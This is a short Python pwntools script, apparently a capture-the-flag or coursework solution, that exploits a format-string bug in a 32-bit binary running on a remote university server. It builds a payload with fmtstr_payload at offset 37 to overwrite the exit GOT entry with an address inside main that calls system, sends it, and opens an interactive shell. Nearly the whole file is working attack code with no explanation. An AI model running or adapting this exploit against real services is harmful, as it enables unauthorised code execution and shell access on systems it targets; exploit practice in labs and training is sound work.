#!/usr/bin/env python3

from pwn import *

e = ELF("./bin_patched")

context.binary = e

def conn(cond):
    if cond == 1:
        r = process([e.path])
    elif cond == 2:
        r = gdb.debug([e.path], gdbscript="""
            
            """)
    elif cond == 3:
        r = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10060)

    return r


def main():
    r = conn(3)

    # r.sendline(b"AAAA" + b".%37$08x")
    # r.sendline(b"A")
    offset = 37

    addrExitGot = 0x804a02c
    addrMainSystem = 0x080488c2

    
    writeTo = {addrExitGot: addrMainSystem}
    payload = fmtstr_payload(offset, writeTo)
    r.sendline(payload)
    r.sendline(b"A")

    r.interactive()

if __name__ == "__main__":
    main()